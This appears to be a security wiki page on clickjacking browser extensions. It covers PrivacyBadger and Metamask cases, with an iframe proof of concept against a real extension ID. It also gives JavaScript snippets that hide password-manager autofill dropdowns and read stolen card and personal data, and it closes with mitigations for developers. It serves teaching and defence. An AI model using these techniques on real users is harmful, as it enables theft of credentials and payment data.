# BrowExt - ClickJacking

## Basic Information

This page is going to abuse a ClickJacking vulnerability in a Browser extension.\
If you don't know what ClickJacking is check:

[[../clickjacking.md]]

Extensions contains the file **`manifest.json`** and that JSON file has a field `web_accessible_resources`. Here's what [the Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) say about it:

> These resources would then be available in a webpage via the URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, which can be generated with the **`extension.getURL method`**. Allowlisted resources are served with appropriate CORS headers, so they're available via mechanisms like XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

The **`web_accessible_resources`** in a browser extension are not just accessible via the web; they also operate with the extension's inherent privileges. This means they have the capability to:

- Change the extension's state
- Load additional resources
- Interact with the browser to a certain extent

However, this feature presents a security risk. If a resource within **`web_accessible_resources`** has any significant functionality, an attacker could potentially embed this resource into an external web page. Unsuspecting users visiting this page might inadvertently activate this embedded resource. Such activation could lead to unintended consequences, depending on the permissions and capabilities of the extension's resources.

## PrivacyBadger Example

In the extension PrivacyBadger, a vulnerability was identified related to the `skin/` directory being declared as `web_accessible_resources` in the following manner (Check the original [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):

```json
"web_accessible_resources": [
  "skin/*",
  "icons/*"
]
```

This configuration led to a potential security issue. Specifically, the `skin/popup.html` file, which is rendered upon interaction with the PrivacyBadger icon in the browser, could be embedded within an `iframe`. This embedding could be exploited to deceive users into inadvertently clicking on "Disable PrivacyBadger for this Website". Such an action would compromise the user's privacy by disabling the PrivacyBadger protection and potentially subjecting the user to increased tracking. A visual demonstration of this exploit can be viewed in a ClickJacking video example provided at [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

To address this vulnerability, a straightforward solution was implemented: the removal of `/skin/*` from the list of `web_accessible_resources`. This change effectively mitigated the risk by ensuring that the content of the `skin/` directory could not be accessed or manipulated through web-accessible resources.

The fix was easy: **remove `/skin/*` from the `web_accessible_resources`**.

### PoC

```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
  iframe {
    width: 430px;
    height: 300px;
    opacity: 0.01;
    float: top;
    position: absolute;
  }

  #stuff {
    float: top;
    position: absolute;
  }

  button {
    float: top;
    position: absolute;
    top: 168px;
    left: 100px;
  }
</style>

<div id="stuff">
  <h1>Click the button</h1>
  <button id="button">click me</button>
</div>

<iframe
  src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```

## Metamask Example

A [**blog post about a ClickJacking in metamask can be found here**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). In this case, Metamask fixed the vulnerability by checking that the protocol used to access it was **`https:`** or **`http:`** (not **`chrome:`** for example):

![](../../images/image (21).png)

**Another ClickJacking fixed** in the Metamask extension was that users were able to **Click to whitelist** when a page was suspicious of being phishing because of `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. As that page was vulnerable to Clickjacking, an attacker could abuse it showing something normal to make the victim click to whitelist it without noticing, and then going back to the phishing page which will be whitelisted.

## DOM-based Extension Clickjacking (Password Manager Autofill UIs)

Classic extension clickjacking abuses misconfigured `web_accessible_resources` to iframe privileged HTML and drive user clicks. A newer class, DOM-based extension clickjacking, targets the autofill dropdowns injected by password managers directly into the page DOM and uses CSS/DOM tricks to hide or occlude them while keeping them clickable. One coerced click can select a stored item and fill attacker-controlled inputs with sensitive data.

### Threat model

- Attacker controls a webpage (or achieves XSS/subdomain takeover/cache poisoning on a related domain).
- Victim has a password manager extension installed and unlocked (some autofill even when nominally locked).
- At least one user click is induced (overlayed cookie banners, dialogs, CAPTCHAs, games, etc.).

### Attack flow (manual autofill)

1. Inject an invisible but focusable form (login/PII/credit-card fields).
2. Focus an input to summon the extension’s autofill dropdown near the field.
3. Hide or occlude the extension UI while keeping it interactable.
4. Align a believable control under the hidden dropdown to coerce a click that selects an item.
5. Read filled values from the attacker form and exfiltrate.

### How to hide the autofill UI

- Extension element
  - Root element opacity (generic):

```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```

  - Child inside open ShadowRoot (dynamic tag, hide internal iframe):

```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
  .find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
  const frame = root.shadowRoot.querySelector('iframe')
  if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```

- Parent element
  - BODY/HTML opacity tricks to make extension UI invisible while page looks normal (e.g., screenshot background):

```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
  const num = document.getElementById('cardnumber').value
  const exp = document.getElementById('expiry').value
  const cvc = document.getElementById('cvc').value
  // exfiltrate via XHR/fetch/websocket
}
```

- Overlay
  - Partial overlay: occlude everything but a few pixels so the dropdown remains clickable (ensure attacker overlay is last in DOM with max z-index, or use Top Layer).
  - Full overlay using pointer-events:none so clicks pass through to the hidden dropdown; keep it persistent with the Popover API:

```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
  overlay.showPopover()
  // Inject a personal data form and focus to trigger dropdown
  /* create #personalform with #name/#email/#phone/... */
  document.getElementById('name').focus()
  function getData(){ /* read + exfil values on change */ }
</script>
```

### Positioning the victim click

- Fixed placement: position the hidden dropdown under a believable control such as “Accept cookies”, “Close”, or a CAPTCHA checkbox.
- Follow-mouse: move the focused input under the cursor so the dropdown tracks it; refocus periodically so a single click anywhere selects an item:

```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
  personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
  // some managers hide the dropdown if focus is lost; refocus slowly
  setTimeout(() => f.focus(), 100)
})
```

### Impact and scenarios

- Attacker-controlled site: one coerced click can exfiltrate credit card data (number/expiry/CVC) and personal info (name, email, phone, address, DOB) that aren’t domain-scoped.
- Trusted site with XSS/subdomain takeover/cache poisoning: multi-click theft of credentials (username/password) and TOTP, because many managers autofill across related subdomains/parent domains (e.g., `*.example.com`).
- Passkeys: if the RP doesn’t bind WebAuthn challenges to the session, XSS can intercept the signed assertion; DOM-based clickjacking hides the passkey prompt to elicit the user’s confirming click.

### Limitations

- Requires at least one user click and decent pixel alignment (realistic overlays make clicks easy to solicit).
- Auto-lock/logout reduces windows of exploitation; some managers still autofill while “locked”.

### Extension developer mitigations

- Render autofill UI in the Top Layer (Popover API) or otherwise ensure it sits above page stacking; avoid being covered by page-controlled overlays.
- Resist CSS tampering: prefer Closed Shadow DOM and monitor with `MutationObserver` for suspicious style changes on UI roots.
- Detect hostile overlays before filling: enumerate other top-layer/popover elements, temporarily disable `pointer-events:none`, and use `elementsFromPoint()` to detect occlusion; close UI if overlays exist.
- Detect suspicious `<body>`/`<html>` opacity or style changes both pre- and post-render.
- For iframe-based issues: scope MV3 `web_accessible_resources` `matches` narrowly and avoid exposing HTML UIs; for unavoidable HTML, serve `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`.
